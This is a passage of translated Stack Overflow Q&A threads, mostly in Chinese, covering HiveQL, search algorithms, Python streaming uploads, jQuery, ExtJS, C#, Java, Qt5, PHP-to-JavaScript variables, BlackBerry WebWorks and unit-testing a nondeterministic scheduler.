HiveQL 是用于迁移到 Hadoop 的数据仓库团队的类 SQL 语言，因为它为他们提供了一种熟悉的 SQL 语言，隐藏了 MR 编程的复杂性。Hive 不支持完整的 SQL-92 规范，缺少的规范可以在 Hive 中轻松解决.Hive 有一些 SQL-92 中没有的扩展，这些扩展受到 Mapreduce 的启发。HiveQL 最类似于 MySQL 的 SQL 方言。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-10T03:20:43.660

不，这没有多大意义。

每个 RDBMS 都有稍微不同的 SQL——即使是那些在规范中的语句。HiveQL 也有其独特之处。

此外，Hive 并未提供 RDBMS 提供的所有功能，但它正在迎头赶上。

您必须熟悉 HiveQL 才能翻译查询。翻译基本上就是复制和修改，特别是如果你使用的是最接近的 MySQL。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T14:08:48.490

HiveQL 与 SQL 并没有完全不同。HiveQL 是带有一些扩展的 ANSI SQL 的子集。[有关HiveQL](https://cwiki.apache.org/confluence/display/Hive/LanguageManual)的更多详细信息，请点击此处。AFAIK，没有用于转换的工具，文档应该有所帮助。

# algorithm - 深度优先迭代加深搜索与深度优先搜索

> ID：15973202
> 
> 赞同：4
> 
> 时间：2013-04-12T13:55:26.157
> 
> 标签：algorithm, search

我实际上没有关于编码的问题，但是搜索算法，我希望这没问题。在作业中，我需要解决以下问题：

“描述一个状态空间，其中 dfid 比 dfs 差得多，例如 O(n²) 与 O(n)。” dfid 是深度优先迭代深度搜索和 dfs 正常深度优先搜索。我不确定如何解决这个问题，我知道对于树中的两个搜索来说，最坏的情况运行时间就像 O(b^d) 一样，但我发现很难找到一个好的例子。

我想到了一棵只有 2 个分支的树，因为分支越低，dfid 运行时就越差。

有人可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-12T15:17:59.750

如果您的状态空间就像一个链表（即每个节点只有 1 个子节点）并且目标状态是叶子，那么您最终会得到您所描述的情况。

使用 DFS，您将沿着每个孩子前进，直到到达叶子。如果有`n`节点，则运行时间为 O(n)。

使用 IDS，在第一次迭代中，您将只访问根的子节点。在第二次迭代中，您将访问根的子节点和它自己的子节点（深度 = 2，访问了 2 个节点）。在第三次迭代中，您进入深度 3，访问 3 个节点。因此总访问次数为 1 + 2 + .... + n = O(n^2)。

# javascript - 如何在我的网页上模拟 10 或 100 次点击

> ID：15973203
> 
> 赞同：0
> 
> 时间：2013-04-12T13:55:27.280
> 
> 标签：javascript, html, testing, web-applications

我在网页上有一个间歇性错误，我需要继续单击打开弹出窗口的链接，然后关闭弹出窗口并再次单击该链接。我需要多次这样做。我怎样才能模拟它，以便在我观看时自动完成？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T13:58:04.443

我会为此使用任何测试框架，例如[Selenium](http://docs.seleniumhq.org/)，记录所需操作的宏，并在必要时为这个特殊目的更新代码......

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T13:58:46.770

你可以使用[selenium](http://docs.seleniumhq.org/)，尤其是[selenium IDE](http://release.seleniumhq.org/selenium-ide/1.10.0/selenium-ide-1.10.0.xpi)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T14:00:28.407

在 Firefox 中，你有一个插件“DejaCLick” 如果你想看到你的光标在屏幕上点击并关闭弹出窗口数百次，这是一个好方法。

[https://addons.mozilla.org/nl/firefox/addon/dejaclick/](https://addons.mozilla.org/nl/firefox/addon/dejaclick/)

DejaClick 记录您的鼠标移动和点击，并且可以重复多次！

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-12T14:04:25.937

您可以通过以下方式模拟点击：

```
<a id="a" href="javascript:;" onclick="alert(1)" >sometext</a>
<script>
for(var i=0;i<100;i++){
  document.getElementById("a").click();
}
</script> 
```

# python - 使用 Python 请求“桥接”文件而不加载到内存中？

> ID：15973204
> 
> 赞同：13
> 
> 时间：2013-04-12T13:55:29.793
> 
> 标签：python, python-2.7, python-requests

我想使用[Python Requests](http://www.python-requests.org/)库从 url 获取文件并将其用作发布请求中的多部分编码文件。问题是该文件可能非常大（50MB-2GB），我不想将它加载到内存中。[（这里的](https://stackoverflow.com/questions/15970514/send-large-files-to-gae-blobstore-via-api-from-s3)上下文。）

按照文档中的示例（[multipart](http://www.python-requests.org/en/latest/user/quickstart/#post-a-multipart-encoded-file)，[stream down](http://www.python-requests.org/en/latest/user/advanced/#body-content-workflow)和[stream up](http://www.python-requests.org/en/latest/user/advanced/#streaming-uploads)）我做了这样的事情：

```
 with requests.get(big_file_url, stream=True) as f:
        requests.post(upload_url, files={'file': ('filename', f.content)}) 
```

但我不确定我做得对。它实际上是在抛出这个错误 - 从回溯中编辑：

```
 with requests.get(big_file_url, stream=True) as f:
    AttributeError: __exit__ 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-27T00:41:04.677

正如其他答案已经指出的那样：[`requests`不支持 POSTing multipart-encoded files without loading them into memory](https://github.com/kennethreitz/requests/issues/295)。

要使用 multipart/form-data 上传大文件而不将其加载到内存中，您可以使用[`poster`](http://atlee.ca/software/poster/)：

```
#!/usr/bin/env python
import sys
from urllib2 import Request, urlopen

from poster.encode import multipart_encode # $ pip install poster
from poster.streaminghttp import register_openers

register_openers() # install openers globally

def report_progress(param, current, total):
    sys.stderr.write("\r%03d%% of %d" % (int(1e2*current/total + .5), total))

url = 'http://example.com/path/'
params = {'file': open(sys.argv[1], "rb"), 'name': 'upload test'}
response = urlopen(Request(url, *multipart_encode(params, cb=report_progress)))
print response.read() 
```

它可以调整为允许 GET 响应对象而不是本地文件：

```
import posixpath
import sys
from urllib import unquote
from urllib2 import Request, urlopen
from urlparse import urlsplit

from poster.encode import MultipartParam, multipart_encode # pip install poster
from poster.streaminghttp import register_openers

register_openers() # install openers globally

class MultipartParamNoReset(MultipartParam):
    def reset(self):
        pass # do nothing (to allow self.fileobj without seek() method)

get_url = 'http://example.com/bigfile'
post_url = 'http://example.com/path/'

get_response = urlopen(get_url)
param = MultipartParamNoReset(
    name='file',
    filename=posixpath.basename(unquote(urlsplit(get_url).path)), #XXX \ bslash
    filetype=get_response.headers['Content-Type'],
    filesize=int(get_response.headers['Content-Length']),
    fileobj=get_response)

params = [('name', 'upload test'), param]
datagen, headers = multipart_encode(params, cb=report_progress)
post_response = urlopen(Request(post_url, datagen, headers))
print post_response.read() 
```

此解决方案需要`Content-Length`GET 响应中的有效标头（已知文件大小）。如果文件大小未知，则可以使用分块传输编码来上传多部分/表单数据内容。`urllib3.filepost`可以使用库附带的类似解决方案来实现，`requests`例如，基于[@AdrienF 的回答](https://stackoverflow.com/a/16221027/4279)而不使用`poster`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T23:42:33.947

你不能把任何你喜欢的东西变成 python 中的上下文管理器。它需要非常具体的属性才能成为一个。使用您当前的代码，您可以执行以下操作：

```
response = requests.get(big_file_url, stream=True)

post_response = requests.post(upload_url, files={'file': ('filename', response.iter_content())}) 
```

使用`iter_content`将确保您的文件永远不会在内存中。将使用迭代器，否则通过使用`content`属性将文件**加载**到内存中。

**编辑**合理地做到这一点的唯一方法是使用[块编码上传](http://www.python-requests.org/en/latest/user/advanced/#chunk-encoded-requests)，例如，

```
post_response = requests.post(upload_url, data=response.iter_content()) 
```

如果您绝对需要进行 multipart/form-data 编码，那么您将必须创建一个抽象层，该层将在构造函数中使用生成器，以及`Content-Length`来自`response`（为 提供答案`len(file)`）的标头，该标头将具有读取属性，该属性将读取从发电机。问题再次是我很确定整个内容会在上传之前被读入内存。

**编辑#2**

您也许可以制作自己的生成器，自己生成`multipart/form-data`编码数据。您可以通过与块编码请求相同的方式传递它，但您必须确保设置自己的`Content-Type`和`Content-Length`标头。我没有时间画一个例子，但应该不会太难。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T17:26:08.457

[实际上在 Kenneth Reitz 的 GitHub repo](https://github.com/kennethreitz/requests/issues/295)上有一个关于这个的问题。我有同样的问题（虽然我只是上传一个本地文件），我添加了一个包装类，它是一个与请求的不同部分相对应的流列表，并带有一个迭代列表的 read() 属性和读取每个部分，并获取标题的必要值（边界和内容长度）：

```
# coding=utf-8

from __future__ import unicode_literals
from mimetools import choose_boundary
from requests.packages.urllib3.filepost import iter_fields, get_content_type
from io import BytesIO
import codecs

writer = codecs.lookup('utf-8')[3]

class MultipartUploadWrapper(object):

    def __init__(self, files):
        """
        Initializer

        :param files:
            A dictionary of files to upload, of the form {'file': ('filename', <file object>)}
        :type network_down_callback:
            Dict
        """
        super(MultipartUploadWrapper, self).__init__()
        self._cursor = 0
        self._body_parts = None
        self.content_type_header = None
        self.content_length_header = None
        self.create_request_parts(files)

    def create_request_parts(self, files):
        request_list = []
        boundary = choose_boundary()
        content_length = 0

        boundary_string = b'--%s\r\n' % (boundary)
        for fieldname, value in iter_fields(files):
            content_length += len(boundary_string)

            if isinstance(value, tuple):
                filename, data = value
                content_disposition_string = (('Content-Disposition: form-data; name="%s"; ''filename="%s"\r\n' % (fieldname, filename))
                                            + ('Content-Type: %s\r\n\r\n' % (get_content_type(filename))))

            else:
                data = value
                content_disposition_string =  (('Content-Disposition: form-data; name="%s"\r\n' % (fieldname))
                                            + 'Content-Type: text/plain\r\n\r\n')
            request_list.append(BytesIO(str(boundary_string + content_disposition_string)))
            content_length += len(content_disposition_string)
            if hasattr(data, 'read'):
                data_stream = data
            else:
                data_stream = BytesIO(str(data))

            data_stream.seek(0,2)
            data_size = data_stream.tell()
            data_stream.seek(0)

            request_list.append(data_stream)
            content_length += data_size

            end_string = b'\r\n'
            request_list.append(BytesIO(end_string))
            content_length += len(end_string)

        request_list.append(BytesIO(b'--%s--\r\n' % (boundary)))
        content_length += len(boundary_string)

        # There's a bug in httplib.py that generates a UnicodeDecodeError on binary uploads if
        # there are *any* unicode strings passed into headers as part of the requests call.
        # For this reason all strings are explicitly converted to non-unicode at this point.
        self.content_type_header = {b'Content-Type': b'multipart/form-data; boundary=%s' % boundary}
        self.content_length_header = {b'Content-Length': str(content_length)}
        self._body_parts = request_list

    def read(self, chunk_size=0):
        remaining_to_read = chunk_size
        output_array = []
        while remaining_to_read > 0:
            body_part = self._body_parts[self._cursor]
            current_piece = body_part.read(remaining_to_read)
            length_read = len(current_piece)
            output_array.append(current_piece)
            if length_read < remaining_to_read:
                # we finished this piece but haven't read enough, moving on to the next one
                remaining_to_read -= length_read
                if self._cursor == len(self._body_parts) - 1:
                    break
                else:
                    self._cursor += 1
            else:
                break
        return b''.join(output_array) 
```

因此，不是传递“文件”关键字 arg，而是将此对象作为“数据”属性传递给 Request.request 对象

## 编辑

我已经清理了代码

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-04-12T08:01:14.507

理论上你可以只使用原始对象

```
In [1]: import requests

In [2]: raw = requests.get("http://download.thinkbroadband.com/1GB.zip", stream=True).raw

In [3]: raw.read(10)
Out[3]: '\xff\xda\x18\x9f@\x8d\x04\xa11_'

In [4]: raw.read(10)
Out[4]: 'l\x15b\x8blVO\xe7\x84\xd8'

In [5]: raw.read() # take forever...

In [6]: raw = requests.get("http://download.thinkbroadband.com/5MB.zip", stream=True).raw

In [7]: requests.post("http://www.amazon.com", {'file': ('thing.zip', raw, 'application/zip')}, stream=True)
Out[7]: <Response [200]> 
```

# javascript - jQuery点击添加到图像的src

> ID：15973208
> 
> 赞同：0
> 
> 时间：2013-04-12T13:55:43.717
> 
> 标签：javascript, jquery

例如说我有两个图像称为： -

```
<img alt="img-estate" src="images/estate.png" />

<img alt="img-saloon" src="images/saloon.png" /> 
```

单击这些图像中的任何一个时，我都希望能够更改 src 以`-active`在单击时添加。

因此，如果我单击#img-estate，图像 src 应该是`images/estate-active.png`. 所以基本上它读取原始 src 位置并添加`-active`在点击时添加。

我将如何使用 jQuery 来做这件事？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T13:58:51.017

单击后，以下内容将有效地切换*字符串*`-active`：

```
$('img').click(function(){
    var src = this.src;
    this.src = src.indexOf('-active') == -1 ? src.replace('.png','-active.png') : src.replace('-active.png','.png');
}); 
```

如果您只想*添加*该字符串：

```
$('img').click(function(){
    var src = this.src;
    this.src = src.replace('.png','-active.png');
}); 
```

要将其仅应用于问题中列出的那些元素，您可以将选择器修改为：

```
$('img[alt^="img-"]') 
```

它只选择那些`alt`属性以字符串开头的图像`img-`。

顺便说一句，如果您更喜欢使用 jQuery`attr()`方法，则不必调用两次相同的方法，只需使用匿名函数即可：

```
$('img[alt^="img-"]').attr('src', function(index, currentSrc){
    return currentSrc.replace('.png', '-active.png');
}); 
```

参考：

*   [`attr()`](http://api.jquery.com/attr/).
*   [属性以 ( `[attribute^="value"]`)](http://api.jquery.com/attribute-starts-with-selector/)开头。
*   [`click()`](http://api.jquery.com/click/).
*   [`String.replace()`](https://developer.mozilla.org/en/docs/JavaScript/Reference/Global_Objects/String/replace).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T13:59:35.553

```
$('img').click(function() {
  var $this = $(this);
  $this.attr('src', $this.attr('src').replace(/\.png$/, '-active.png'));
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T13:59:37.767

尝试这个：

```
$('img').click(function(){
   var src = $(this).attr('src');
   src = src.substring(0, src.length-4);
   $(this).attr('src', src+'-active.png');
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-12T13:58:28.853

像这样的东西可能会奏效

```
$('img').on('click', function() {
   var $img = $(this);
   var currentSrc = $img.prop('src');
   $img.prop('src', currentSrc.replace('.png','-active.png'));
}); 
```

[**演示**](http://jsfiddle.net/GTfcG/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-12T14:00:13.153

首先为图像添加一个类：

```
<img alt="img-estate" class="clickable_image" src="images/estate.png" />

$('.clickable_image).on('click, function(e){

      var source = $(e.target).attr('src').Split('.');
      $(e.target).attr('src','source[0] + '-active' + source[1]);

}); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-12T13:59:59.743

此功能应该可以完美运行：

```
$('img').click(function(){
    $(this).attr('src', $(this).attr('src').replace(/\.png/, '-active.png'));
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-12T14:05:52.430

```
$(function() {
 $('img').click(function(){
 var image =  $(this).attr('src');
 alert(image);
 var newimage = image.replace('.png','-active.png');
 alert(newimage);

 $(this).attr('src',"newimage");
 return false;
 });
}); 
```

[例子](http://jsfiddle.net/chauhangs/2UptD/)

# extjs - ExtJS：编辑整个网格并一次保存

> ID：15973237
> 
> 赞同：1
> 
> 时间：2013-04-12T13:56:58.350
> 
> 标签：extjs, extjs3

我需要生成一个网格，其中所有行都处于编辑模式，并且可以通过单击“保存”按钮一次保存每行的值。这可能吗？如果是这样，最好的方法是什么？使用 ExtJs 的网格来满足这个要求是个好主意吗？通过查看 Ext Js 的示例，框架开发人员似乎非常鼓励一次编辑一行或一个单元格的网格，而不是整个表格。

我还想指出，分页不是必需的。

**更新：** 我正在使用 Ext JS 3.4。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-16T15:16:53.057

可能是下面的代码帮助：

```
/**
 *   This method is called on save button click by passing the grid object as a parameter
 */
saveGridModifiedRecords = function (yourGrid) {
    Ext.getCmp("yourGridId").body.mask('Saving Record Please Wait...');
    var modifiedRecords = yourGrid.getStore().getModifiedRecords();
    var CIxml = StringToXML("<Root/>");
    for (var i = 0; i < modifiedRecords.length; i++) {
        var fields = modifiedRecords[i]; // Gives you each edited record
        var cuurElem = CIxml.createElement("I");
        cuurElem.setAttribute("name", fields.get("name")); // Here name is the dataindex of a field
        cuurElem.setAttribute("category", fields.get("category")); // Here category is the dataindex of a field
        CIxml.documentElement.appendChild(cuurElem);
    }

    Use an AJAX call to send this xml with modified records to server.

    Ext.Ajax.request({
        url : 'yourWebServiceURL/parameter1/parametr2',
        method : 'POST',
        timeout : 120000,
        params : {
            'strIPXML' : CIxml.xml
        }, // We are passing xml as a string here by using .xml
        success : function (response) {
            // Extract response.resposeXML for a xml format of response else response.responseText for a string.
            Ext.getCmp("yourGridId").body.unmask();
            alert('In success');
        },
        failure : function (response) {
            alert('In Failure');
            if (Ext.getCmp("yourGridId")) {
                Ext.getCmp("yourGridId").body.unmask();
            }
        }
    });
}

function StringToXML(oString) {
 //code for IE
 if (window.ActiveXObject) { 
 var oXML = new ActiveXObject("Microsoft.XMLDOM"); oXML.loadXML(oString);
 return oXML;
 }
 // code for Chrome, Safari, Firefox, Opera, etc. 
 else {
 return (new DOMParser()).parseFromString(oString, "text/xml");
 }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T15:54:50.157

**更新**：好的，这对于 Ext JS v. 4.x 是正确的 :)

您可以做的是在底层 Store 中设置`autoSync: false`，这样它就不会立即将更改写入服务器。

在您的保存按钮上，您只需调用`grid.getStore().sync()`

请参阅：[API - Ext.data.Store.sync()](http://docs.sencha.com/ext-js/4-2/#!/api/Ext.data.Store-method-sync)

# c# - How i can find selected image in web Browser in C#?

> ID：15973238
> 
> 赞同：1
> 
> 时间：2013-04-12T13:57:01.463
> 
> 标签：c#, alignment, webbrowser-control

i have a web browser that it's edit mode is on and sum users work with it.

users can insert image but not with UI of web browser control but they select an image from a form and i insert them by code below :

```
private void insert_image_btn_Click(object sender, EventArgs e)
{
    HtmlElement userimage = webBrowser1.Document.CreateElement("img");
    userimage.SetAttribute("src", "image location");
    userimage.Id = "imageid";
    webBrowser1.Document.Body.AppendChild(userimage);
} 
```

and i want to write some code that users can change the alignment of any image that inserts in web browser, i give them a combo Box that can select the alignment they want. but problem is that when they click on an image then change the combo Box value i can't find what image was clicked by user to change alignment.

how i can find what image are selected?

i find it's solution

```
private void Document_ContextMenuShowing(object sender, HtmlElementEventArgs e)
{
e.ReturnValue = false;
selectedElement = webBrowser1.Document.GetElementFromPoint(e.MousePosition);

string tag = selectedElement.TagName;
if (tag == "IMG")
{
alignmentTscb.Enabled = true;
alignmentTscb.Text = selectedElement.GetAttribute("align");
}
else
alignmentTscb.Enabled = false;
} 
```

`selectedElement` is the element that user right Click on it.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:48:25.813

You could store the image controls in an array and have a class level variable that tells you which one was last clicked.

In the click event handler of the image you can set the variable.

When a value in the dropdown box is selected you can check the variable to see which image was clicked on last. Then look at the array of images and align as necessary.

Let me know if you need a code example.

# android - 创建自定义安卓服务

> ID：15973242
> 
> 赞同：0
> 
> 时间：2013-04-12T13:57:05.690
> 
> 标签：android

我打算写一个服务。我正在查看 SurfaceFlinger 代码作为参考。SurfaceFlinger 派生自 BinderService<> 和 IInterface<>。

如果我想创建一个服务，从 IInterface 继承并调用 addService 方法将我的服务添加到服务管理器就足够了吗？这是否允许我的应用程序与新服务通信？

我们什么时候应该继承BinderService？？

# java - 平均值和数组（Codingbat：scoresAverage）

> ID：15973245
> 
> 赞同：0
> 
> 时间：2013-04-12T13:57:16.763
> 
> 标签：java, average

我正在处理codingbat.com 上的Java 问题，并在这个*scoresAverage*上停了下来。由于练习描述有点复杂，我将简单地粘贴在这里：

> 给定一个分数数组，计算前半部分和后半部分的 int 平均值，并返回较大的那个。我们会说后半部分从索引长度/2 开始。数组长度至少为 2。要练习分解，请编写一个单独的辅助方法
> int average(int[] scores, int start, int end) { 计算索引 start..end 之间元素的平均值。调用您的辅助方法两次以实现 scoreAverage()。在 JavaBat 文本区域中的 scoresAverage() 方法之后编写您的辅助方法。通常你会用双精度计算平均值，但这里我们使用整数，所以预期的结果是准确的。

我到目前为止的代码没有返回任何错误，但它返回的数字不正确。谁能帮我这个？我的代码尝试如下：

```
public int scoresAverage(int[] scores) {
  int mid = scores.length/2;

  int average1 = average(scores, 0, mid);
  int average2 = average(scores, mid, scores.length);

  return Math.max(average1,average2); 
}

public int average(int[] scores, int start, int end){
  int sum = 0;
  for (int i=start; i<end; i++){
    sum += scores[i];
  }
  return sum/(scores.length);
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-12T13:59:05.737

`sum/scores.length`将平均所有数字的总和；你想`sum/(end - start)`平均数字子集的总和

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-24T20:29:28.563

这将得到每一半的平均值：

```
return sum/(scores.length/2) 
```

# c++ - 如何用 Qt5 编译 QwtPlot3d？

> ID：15973247
> 
> 赞同：1
> 
> 时间：2013-04-12T13:57:17.060
> 
> 标签：c++, qt5, qwt

Qt5 发布，新的Qt5.0.2 有MSVC2012 x64 版本。想将 QwtPlot3d 与 Qt5 一起使用。编译时出现GLdouble重定义错误。不知道原因以及如何解决。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-11T14:27:51.830

这似乎是 OpenGL 桌面与 OpenGL ES 2 的问题。Qt5 预编译包是针对提供 OpenGL ES 2 的 ANGLE 构建的。如果有适合您的版本（OPENGL 32 位），请检查[QT 下载页面。](http://qt-project.org/downloads/)

如果您想在带有 Qt 5 的 Windows 上使用桌面 OpenGL，您必须自己重建 Qt，将 -opengl desktop 传递给 configure.bat 脚本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-06T12:05:41.520

当然不再需要自己重新编译 QT，因为他们现在还为 opengl-desktop 提供了预构建的安装程序

# php - 引用 php 会话变量解析为 Javascript 中的变量

> ID：15973249
> 
> 赞同：0
> 
> 时间：2013-04-12T13:57:27.633
> 
> 标签：php, javascript

我有以下 javascript 代码：

```
window.companyID=<?php echo $_SESSION['IDCompany']; ?>;
window.userID=<?php echo $_SESSION['IDUser']; ?>;
window.sLevel=<?php echo $_SESSION['SLevel']; ?>; 
```

前两个解决它们的适当值。但最后一个是出于某种原因做一些 javascript 不喜欢的事情。当页面加载时，控制台日志在我分配变量后立即给我以下错误：

> 未捕获的 ReferenceError：未定义 S1。

“S1”是正确的值。但是，似乎 javascript 认为 S1 是一个变量，尽管我不知道。我尝试强制 JS 将其视为字符串，但没有奏效。无论我做什么，分配的直接结果总是会产生错误。

任何想法为什么这会发生在这个特定的会话变量而不是前两个变量上？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T13:58:37.987

由于它是一个字符串，因此您必须将值括在引号中：

```
window.sLevel='<?php echo $_SESSION['SLevel']; ?>';
//            ^                                  ^ 
```

其他两个变量是 ID，所以我猜它们只是数字（不必引用），所以你对这些很好。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T13:59:32.073

我想你的其他两个 SESSION 变量返回整数......你收到这个错误是因为你在这个中返回一个字符串，因此它应该在单引号之间：

```
window.sLevel='<?php echo $_SESSION['SLevel']; ?>'; 
```

# blackberry - Blackberry Webworks 中的错误：在任何扩展中都找不到功能

> ID：15973253
> 
> 赞同：0
> 
> 时间：2013-04-12T13:57:34.110
> 
> 标签：blackberry, blackberry-simulator, blackberry-webworks

当我尝试运行时出现错误`blackberry Webworks project`

```
[ERROR] Feature cannot be found in any extension(blackberry.media.microphone) 
```

**我做了什么：**

我使用了简单的 html 文件，名为`login.html`

我没有在我的应用程序中使用任何类型的音频文件，我还添加了`feature`如下：

```
<feature id="blackberry.system" required="true" version="1.0.0.0" />
  <feature id="org.apache.cordova" required="true" version="1.0.0" />
  <feature id="blackberry.find" required="true" version="1.0.0.0" />
  <feature id="blackberry.identity" required="true" version="1.0.0.0" />
  <feature id="blackberry.identity.phone" required="true" version="1.0.0.0" />
  <feature id="blackberry.pim.Address" required="true" version="1.0.0.0" />
  <feature id="blackberry.pim.Contact" required="true" version="1.0.0.0" />
  <feature id="blackberry.io.file" required="true" version="1.0.0.0" />
  <feature id="blackberry.utils" required="true" version="1.0.0.0" />
  <feature id="blackberry.io.dir" required="true" version="1.0.0.0" />
  <feature id="blackberry.app" required="true" version="1.0.0.0" />
  <feature id="blackberry.app.event" required="true" version="1.0.0.0" />
  <feature id="blackberry.system.event" required="true" version="1.0.0.0"/>
  <feature id="blackberry.widgetcache" required="true" version="1.0.0.0"/>
  <feature id="blackberry.media.camera" />
  <feature id="blackberry.ui.dialog" />
  <feature id="blackberry.connection" />
  <feature id="blackberry.bbm.platform" />
  <feature id="blackberry.invoke.card" />
  <feature id="blackberry.pim.contacts" />
  <feature id="blackberry.ui.contextmenu" />
  <feature id="blackberry.io.filetransfer" />
  <feature id="blackberry.io" />
  <feature id="blackberry.invoke" />
  <feature id="blackberry.invoked" />
  <feature id="blackberry.push" />
  <feature id="blackberry.media.microphone"/>

  <!-- Cordova API -->
  <access subdomains="true" uri="file:///store/home/user/voicenotes/" />
  <access subdomains="true" uri="file:///SDCard" />

  <!-- Expose access to all URIs, including the file and http protocols -->
  <access subdomains="true" uri="*" />

  <icon rim:hover="false" src="res/icon/blackberry/icon-80.png" />
  <icon rim:hover="true" src="res/icon/blackberry/icon-80.png" />

  <rim:loadingScreen backgroundColor="#CFCFCF"
                     foregroundImage="res/screen/blackberry/screen-225.png"
             onFirstLaunch="true">
    <rim:transitionEffect type="fadeOut" />
  </rim:loadingScreen>

  <content src ="login.html" />

  <rim:permissions>
    <rim:permit>use_camera</rim:permit>
    <rim:permit>read_device_identifying_information</rim:permit>
    <rim:permit>access_shared</rim:permit>
    <rim:permit>read_geolocation</rim:permit>
    <rim:permit>record_audio</rim:permit> 
    <rim:permit>access_pimdomain_contacts</rim:permit> 
  </rim:permissions> 
```

我没有弄清楚为什么会发生错误！有人可以帮我吗@谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-16T13:40:26.940

这意味着您正在尝试使用不兼容的 API（麦克风）。[BlackBerry OS 5.0+ 和 PlayBook 支持麦克风 API](https://developer.blackberry.com/html5/apis/blackberry.media.microphone.html)，但 BlackBerry 10 不支持。

```
<feature id="blackberry.media.microphone"/> 
```

BlackBerry 10 Webworks SDK 将正确报告它无法识别此功能，因为麦克风现在是 HTML5 标准。

对于 BlackBerry 10，您应该使用[HTML5 标准 getUserMedia()](http://www.html5rocks.com/en/tutorials/getusermedia/intro/)来使用麦克风进行录制。

# python - 使用 Python unittest 测试可以返回非确定性结果的函数

> ID：15973256
> 
> 赞同：5
> 
> 时间：2013-04-12T13:57:35.297
> 
> 标签：python, unit-testing, testing

我正在用 Python 编写一个小型作业调度程序。调度程序可以被赋予一系列可调用对象和依赖项，并且应该运行可调用对象，确保没有任务在其任何前任之前运行。

我正在尝试遵循测试驱动的方法，并且遇到了测试依赖项处理的问题。我的测试代码如下所示：

```
def test_add_dependency(self):
    """Tasks can be added with dependencies"""
    # TODO: Unreliable test, may work sometimes because by default, task
    #       running order is indeterminate.
    self.done = []
    def test(id):
        self.done.append("Test " + id)
    s = Schedule()
    tA = Task("Test A", partial(test, "A"))
    tB = Task("Test B", partial(test, "B"))
    s.add_task(tA)
    s.add_task(tB)
    s.add_dependency(tA, tB)
    s.run()
    self.assertEqual(self.done, ["Test B", "Test A"]) 
```

问题是这个测试（有时）甚至在我添加依赖处理代码之前就已经工作了。这是因为规范没有说明任务必须以特定的顺序运行。所以即使依赖信息被忽略，正确的顺序也是一个完全有效的选择。

有没有办法编写测试来避免这种“意外”成功？在我看来，这是一种相当普遍的情况，尤其是在采用测试驱动的“不要在没有失败测试的情况下编写代码”方法时。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:05:42.547

您处于每个研究人员都在查看一组不完善的数据并试图说出有关它的假设是否正确的情况。

如果运行之间的结果不同，那么多次重新运行将为您提供一个样本，您可以应用统计数据来确定它是否有效。但是，如果一批运行会给你类似的结果，但不同日期的不同批次会给你不同的结果，那么你的不确定性取决于程序本身之外的事件，你需要找到一种方法控制它们，理想情况下，使它们最大限度地提高错误算法的可能性。

这是非确定性的代价；你必须求助于统计数据，你必须得到正确的统计数据。您需要能够以一定的置信度接受假设，并拒绝原假设。如果您可以最大化结果的方差，这需要更少的样本；有不同的 CPU 负载，或 IO 中断，或安排随机休眠的任务。

无论如何，为了定义一个有价值的测试，找出这样的调度程序受到什么影响可能是明智的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:03:13.510

一种选择是使用不同的、确定性的`Schedule`类版本（或添加一个选项以使现有版本确定性）用于测试目的，但这可能会破坏单元测试的目的。

另一种选择是不为非确定性结果编写测试用例。

* * *

不过，总的来说，您的问题的答案...

> 有没有办法编写测试来避免这种“意外”成功？

...可能是“不”，除了在写它们时要特别警惕。尽管如果您有足够的警惕性来避免编写有问题的测试用例，并且您首先将这种警惕性应用于编写代码，那么可以说，您甚至不需要单元测试。;-)

如果单元测试的目的是检测代码中的错误，那么如何检测单元测试中的错误？

您可以为您的单元测试编写“元”单元测试，但是如何检测“元”单元测试中的错误？等等...

现在，这并不是说单元测试没有用，但它们不足以单独“证明”代码是“正确的”。在实践中，我发现基于同行的代码审查是一种更有效的检测代码缺陷的方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:45:32.733

这种策略在很多时候都有效：

首先，消除任何外部熵源（将您的线程池设置为使用单个线程；使用预先播种的 PRNG 模拟任何 RNG 等）然后，反复练习您的测试以产生每种输出组合，仅更改机器的输入正在测试：

```
from itertools import permutations
def test_add_dependency(self):
    """Tasks can be added with dependencies"""
    for p in permutations("AB"):
        self.done = []
        def test(id):
            self.done.append("Test " + id)
        s = Schedule(threads=1)
        tasks = {id: Task("Test " + id, partial(test, id)) for id in "AB"}
        s.add_task(tasks['A'])
        s.add_task(tasks['B'])
        s.add_dependency(tasks[p[0]], tasks[p[1]])
        s.run()
        self.assertEqual(self.done, ["Test " + p[1], "Test " + p[0]]) 
```

如果`Schedule`未能使用来自 的信息，此测试将失败`add_dependency`，因为这是在测试运行之间不同的熵（即信息）的唯一来源。

* * *

